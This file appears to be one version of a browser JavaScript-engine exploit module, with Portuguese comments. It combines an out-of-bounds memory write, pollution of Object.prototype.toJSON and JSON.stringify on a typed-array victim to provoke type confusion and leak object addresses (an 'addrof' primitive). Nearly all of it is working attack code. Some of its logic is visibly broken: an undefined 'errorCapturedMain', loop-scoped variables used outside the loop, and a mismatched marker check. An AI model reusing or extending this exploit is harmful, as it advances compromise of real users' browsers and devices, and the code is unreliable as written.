// js/script3/testArrayBufferVictimCrash.mjs (v79_ForceM2asThis_GetterAndValueIteration)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V79_FM2GVI = "OriginalHeisenbug_TypedArrayAddrof_v79_ForceM2GetterIter";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
// OOB_WRITE_VALUE será iterado
const OOB_WRITE_VALUES_V79 = [0xFFFFFFFF, 0x7FFFFFFF]; 

let object_to_leak_A_v79 = null;
let object_to_leak_B_v79 = null;
let victim_typed_array_ref_v79 = null; 
let probe_call_count_v79 = 0;
let marker_M1_ref_v79 = null; 
let marker_M2_ref_v79 = null; 
// Armazena os detalhes da chamada da sonda onde M2 foi 'this' e potencialmente confuso
let details_of_M2_as_this_v79 = null; 
const PROBE_CALL_LIMIT_V79 = 5; 


function toJSON_TA_Probe_ForceM2Getter() {
    probe_call_count_v79++;
    const call_num = probe_call_count_v79;
    let current_call_log_info = { // Apenas para logging interno da sonda
        call_number: call_num,
        probe_variant: "TA_Probe_V79_ForceM2Getter",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v79),
        this_is_M1: (this === marker_M1_ref_v79 && marker_M1_ref_v79 !== null),
        this_is_M2: (this === marker_M2_ref_v79 && marker_M2_ref_v79 !== null),
        m2_interaction_details: null, // Para quando this é M2
        error_in_probe: null
    };
    logS3(`[PROBE_V79] Call #${call_num}. 'this': ${current_call_log_info.this_type}. IsVictim? ${current_call_log_info.this_is_victim}. IsM1? ${current_call_log_info.this_is_M1}. IsM2? ${current_call_log_info.this_is_M2}`, "leak");

    try {
        if (call_num > PROBE_CALL_LIMIT_V79) {
            logS3(`[PROBE_V79] Call #${call_num}: Probe limit. Stop.`, "warn");
            // Atualizar details_of_M2_as_this_v79 com esta chamada se for a mais relevante até agora
            if (!details_of_M2_as_this_v79 || call_num > (details_of_M2_as_this_v79.call_number || 0) ) {
                 details_of_M2_as_this_v79 = current_call_log_info;
            }
            return { recursion_stopped_v79: true };
        }

        if (call_num === 1 && current_call_log_info.this_is_victim) {
            logS3(`[PROBE_V79] Call #${call_num}: 'this' is victim. Creating M1 and M2. Returning M1 (contains M2).`, "info");
            marker_M2_ref_v79 = { marker_id_v79: "M2_V79_Target", leaky_A_getter: null, leaky_B_direct: null };
            marker_M1_ref_v79 = { marker_id_v79: "M1_V79_Container", payload_M2: marker_M2_ref_v79 };
            details_of_M2_as_this_v79 = current_call_log_info; // P1 details
            return marker_M1_ref_v79;
        } else if (call_num === 2 && current_call_log_info.this_is_M2) {
            // JSON.stringify está processando M1.payload_M2, então 'this' DEVE SER M2.
            logS3(`[PROBE_V79] Call #${call_num}: 'this' IS M2. Current type: ${current_call_log_info.this_type}. Checking for TC...`, "critical");
            current_call_log_info.m2_interaction_details = {
                getter_defined: false, direct_prop_set: false, keys_after: "N/A"
            };
            if (current_call_log_info.this_type === '[object Object]') { 
                logS3(`[PROBE_V79] Call #${call_num}: TYPE CONFUSION ON M2 ('this')! Defining getter & prop...`, "vuln");
                
                Object.defineProperty(this, 'leaky_A_getter', {
                    get: function() {
                        logS3(`[PROBE_V79] !!! Getter 'leaky_A_getter' on confused M2 (call #${call_num}) FIRED !!!`, "vuln");
                        return object_to_leak_A_v79;
                    }, enumerable: true, configurable: true
                });
                current_call_log_info.m2_interaction_details.getter_defined = true;
                
                this.leaky_B_direct = object_to_leak_B_v79;
                current_call_log_info.m2_interaction_details.direct_prop_set = true;
                try{ current_call_log_info.m2_interaction_details.keys_after = Object.keys(this).join(','); } catch(e){}
                logS3(`[PROBE_V79] Call #${call_num}: Getter and prop set on M2 ('this'). Keys: ${current_call_log_info.m2_interaction_details.keys_after}`, "info");
            } else {
                 logS3(`[PROBE_V79] Call #${call_num}: M2 ('this') was NOT [object Object]. Type: ${current_call_log_info.this_type}`, "warn");
            }
            details_of_M2_as_this_v79 = current_call_log_info; // Captura ESTA chamada como a de interesse
            return this; // Retorna M2 (potencialmente modificado)
        } else {
            // Outras chamadas (ex: Call #3 se JSON.stringify continuar após M2 ser retornado)
            logS3(`[PROBE_V79] Call #${call_num}: Unexpected 'this' type or sequence. Type: ${current_call_log_info.this_type}`, "dev_verbose");
             if (!details_of_M2_as_this_v79 || call_num > (details_of_M2_as_this_v79.call_number || 0) ) {
                details_of_M2_as_this_v79 = current_call_log_info;
            }
        }
    } catch (e) {
        current_call_log_info.error_in_probe = e.message;
        logS3(`[PROBE_V79] Call #${call_num}: ERROR in probe: ${e.name} - ${e.message}`, "error");
        if (!details_of_M2_as_this_v79 || call_num >= (details_of_M2_as_this_v79.call_number || 0) ) {
            details_of_M2_as_this_v79 = current_call_log_info;
        }
    }
    
    return { generic_marker_v79: call_num }; 
}


export async function executeTypedArrayVictimAddrofTest_ForceM2asThis_GetterAndValueIteration() {
    const FNAME_CURRENT_TEST_BASE = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V79_FM2GVI}`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST_BASE}: Heisenbug (ForceM2asThis_GetterAndValueIteration) & Addrof ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V79_FM2GVI} Init...`;

    let overall_results = [];

    for (const current_oob_value of OOB_WRITE_VALUES_V79) { // Iterar sobre valores OOB
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Val${toHex(current_oob_value)}`;
        logS3(`\n===== ITERATION: OOB Write Value: ${toHex(current_oob_value)} =====`, "subtest", FNAME_CURRENT_ITERATION);

        probe_call_count_v79 = 0;
        victim_typed_array_ref_v79 = null; 
        marker_M1_ref_v79 = null;
        marker_M2_ref_v79 = null;
        details_of_M2_as_this_v79 = null;
        object_to_leak_A_v79 = { marker_A_v79: `LeakA_Val${toHex(current_oob_value)}`, idA: Date.now() }; 
        object_to_leak_B_v79 = { marker_B_v79: `LeakB_Val${toHex(current_oob_value)}`, idB: Date.now() + 1 };

        let iterError = null;
        let stringifyOutput_parsed = null; 
        
        let addrof_M2_Getter = { success: false, msg: "M2.leaky_A_getter: Default"};
        let addrof_M2_Direct = { success: false, msg: "M2.leaky_B_direct: Default"};

        const fillPattern = 0.79797979797979;

        try {
            await triggerOOB_primitive({ force_reinit: true });
            oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, current_oob_value, 4);
            logS3(`  OOB Write: offset ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)}, value ${toHex(current_oob_value)} done.`, "info", FNAME_CURRENT_ITERATION);
            await PAUSE_S3(100);

            victim_typed_array_ref_v79 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
            logS3(`STEP 2: victim_typed_array_ref_v79 (Uint8Array) created.`, "test", FNAME_CURRENT_ITERATION);
            
            const ppKey = 'toJSON';
            let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
            let pollutionApplied = false;

            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_ForceM2Getter, writable: true, configurable: true, enumerable: false });
                pollutionApplied = true;
                let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v79); 
                logS3(`  JSON.stringify completed for iter Val${toHex(current_oob_value)}. Raw Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_ITERATION);
                try {
                    stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
                } catch (e_parse) {
                    stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput, parse_error: e_parse.message };
                }
                
                // details_of_M2_as_this_v79 deve conter o current_call_details da Call #2 (se this foi M2 e confuso)
                logS3(`  EXECUTE: Details of M2 interaction (if occurred): ${details_of_M2_as_this_v79 ? JSON.stringify(details_of_M2_as_this_v79) : 'N/A'}`, "leak", FNAME_CURRENT_ITERATION);

                let heisenbugOnM2Target = false;
                if (details_of_M2_as_this_v79 && 
                    details_of_M2_as_this_v79.this_is_M2 &&
                    details_of_M2_as_this_v79.this_type === "[object Object]") {
                    heisenbugOnM2Target = true;
                }
                logS3(`  EXECUTE: Heisenbug on M2 Target ${heisenbugOnM2Target ? "CONFIRMED" : "NOT Confirmed"}.`, heisenbugOnM2Target ? "vuln" : "error", FNAME_CURRENT_ITERATION);
                    
                // O addrof é verificado no stringifyOutput_parsed, que deve ser M1 contendo M2 modificado
                logS3("STEP 3: Checking stringifyOutput_parsed (M1 containing M2) for leaked properties...", "warn", FNAME_CURRENT_ITERATION);
                let targetObjectForLeakCheck = null;
                if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id_v79 === "M1_V79" && stringifyOutput_parsed.payload_M2) {
                    targetObjectForLeakCheck = stringifyOutput_parsed.payload_M2; 
                    logS3("   stringifyOutput_parsed seems to be M1 containing M2. Checking M2 (payload_M2).", "info");
                } else {
                    logS3(`   stringifyOutput_parsed was not M1 containing M2 as expected. Content: ${JSON.stringify(stringifyOutput_parsed)}`, "warn", FNAME_CURRENT_ITERATION);
                }

                if (targetObjectForLeakCheck && targetObjectForLeakCheck.marker_id_v79 === "M2_V79_Target") {
                    const val_getter = targetObjectForLeakCheck.leaky_A_getter; // Acessar para disparar o getter
                    if (typeof val_getter === 'number' && val_getter !==0) {
                        let getter_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_getter]).buffer)[0], new Uint32Array(new Float64Array([val_getter]).buffer)[1]);
                        if ((getter_int64.high() > 0 && getter_int64.high() < 0x000F0000) || (getter_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_M2_Getter.success = true; addrof_M2_Getter.msg = `Possible pointer from M2.leaky_A_getter: ${getter_int64.toString(true)}`;
                        } else { addrof_M2_Getter.msg = `M2.leaky_A_getter is num but not ptr: ${val_getter}`; }
                    } else if (val_getter && val_getter.marker_A_v79 === object_to_leak_A_v79.marker_A_v79) {
                         addrof_M2_Getter.success = true; addrof_M2_Getter.msg = "object_to_leak_A_v79 identity from M2.leaky_A_getter.";
                    } else { addrof_M2_Getter.msg = `M2.leaky_A_getter not ptr. Val: ${JSON.stringify(val_getter)}`; }

                    const val_direct = targetObjectForLeakCheck.leaky_B_direct;
                    if (typeof val_direct === 'number' && val_direct !==0) {
                        let direct_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([val_direct]).buffer)[0], new Uint32Array(new Float64Array([val_direct]).buffer)[1]);
                         if ((direct_int64.high() > 0 && direct_int64.high() < 0x000F0000) || (direct_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                           addrof_M2_Direct.success = true; addrof_M2_Direct.msg = `Possible pointer from M2.leaky_B_direct: ${direct_int64.toString(true)}`;
                        } else { addrof_M2_Direct.msg = `M2.leaky_B_direct is num but not ptr: ${val_direct}`; }
                    } else if (val_direct && val_direct.marker_B_v79 === object_to_leak_B_v79.marker_B_v79) {
                         addrof_M2_Direct.success = true; addrof_M2_Direct.msg = "object_to_leak_B_v79 identity from M2.leaky_B_direct.";
                    } else { addrof_M2_Direct.msg = `M2.leaky_B_direct not ptr. Val: ${JSON.stringify(val_direct)}`; }
                } else {
                    addrof_M2_Getter.msg = "Target object M2 not found in stringifyOutput_parsed as expected.";
                    addrof_M2_Direct.msg = "Target object M2 not found in stringifyOutput_parsed as expected.";
                }

            } catch (e_str) { iterError = e_str;
            } finally { if (pollutionApplied) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor || { value: null, writable: true, configurable: true, enumerable: false }); }
        } catch (e_outer) { iterError = e_outer;
        } finally { clearOOBEnvironment({force_clear_even_if_not_setup: true}); }
        
        overall_results.push({
            oob_value: toHex(current_oob_value), error: iterError ? `${iterError.name}: ${iterError.message}` : null,
            last_M2_probe_details: details_of_M2_as_this_v79 ? JSON.parse(JSON.stringify(details_of_M2_as_this_v79)) : null, 
            final_stringify_output_parsed_iter: stringifyOutput_parsed,
            addrof_M2_Getter: {...addrof_M2_Getter}, addrof_M2_Direct: {...addrof_M2_Direct},
            probe_calls_this_iter: probe_call_count_v79 
        });
        if (addrof_M2_Getter.success || addrof_M2_Direct.success) {
            logS3(`!!!! POTENTIAL ADDROF SUCCESS for OOB Value ${toHex(current_oob_value)} !!!!`, "vuln", FNAME_CURRENT_ITERATION);
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V79_FM2GVI}: Addr? Val${toHex(current_oob_value)} SUCCESS!`;
        }
        await PAUSE_S3(100); 
    } // Fim do loop OOB_WRITE_VALUES_V79

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed All Iterations ---`, "test", FNAME_CURRENT_TEST_BASE);
    overall_results.forEach(res => {
        let m2tc = res.last_M2_probe_details?.this_is_M2 && res.last_M2_probe_details?.this_type==='[object Object]';
        logS3(`OOBVal ${res.oob_value}: AddrGetter=${res.addrof_M2_Getter.success}, AddrDirect=${res.addrof_M2_Direct.success}. M2_TC'd? ${m2tc}. Calls: ${res.probe_calls_this_iter}. Err: ${res.error || 'None'}`, 
              (res.addrof_M2_Getter.success || res.addrof_M2_Direct.success) ? "good" : "warn", FNAME_CURRENT_TEST_BASE);
    });
    if (!document.title.includes("SUCCESS")) document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V79_FM2GVI}: All Vals Tested.`;
    
    let result_for_runner = overall_results.find(r => r.addrof_M2_Getter.success || r.addrof_M2_Direct.success);
    if (!result_for_runner && overall_results.length > 0) {
        result_for_runner = overall_results[overall_results.length - 1];
    }

    return { 
        errorOccurred: errorCapturedMain, 
        iteration_results_summary: overall_results.map(r => ({ /* ... */ })),
        toJSON_details: result_for_runner ? result_for_runner.last_M2_probe_details : null, 
        stringifyResult: result_for_runner ? result_for_runner.final_stringify_output_parsed_iter : null,
        addrof_A_result: result_for_runner ? result_for_runner.addrof_M2_Getter : addrof_M2_Getter, 
        addrof_B_result: result_for_runner ? result_for_runner.addrof_M2_Direct : addrof_M2_Direct,  
        total_probe_calls: result_for_runner ? result_for_runner.probe_calls_this_iter : 0 
    };
}
